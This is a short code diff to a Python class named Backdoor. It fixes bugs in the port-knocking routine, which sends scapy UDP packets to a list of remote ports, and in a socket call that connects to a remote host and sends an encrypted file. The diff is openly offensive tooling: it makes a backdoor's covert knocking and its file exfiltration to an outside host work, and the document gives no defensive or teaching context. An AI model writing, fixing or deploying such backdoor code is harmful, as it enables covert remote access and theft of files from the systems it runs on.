@@ -16,7 +16,10 @@ class Backdoor(object):
         self.remotePort = int(rport)
         self.protocol = proto.upper()
 
-        self.knockList = kList
+        self.knockList = []
+        for port in kList.split(','):
+            self.knockList.append(port)
+
         self.password = password
         self.chunk_size = 16
 
@@ -87,7 +90,7 @@ class Backdoor(object):
 
         time.sleep(1)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((self.remoteIP, self.listenPort))
 
         encryptedString = encrypt.encryptedFile(filename)
@@ -97,7 +100,8 @@ class Backdoor(object):
 
     def portKnocking(self, knockList):
         for port in knockList:
-            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(dport=port)
+            print(port)
+            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(dport=int(port))
             send(pkt, verbose=False)
 
     def is_incoming(self, packet):
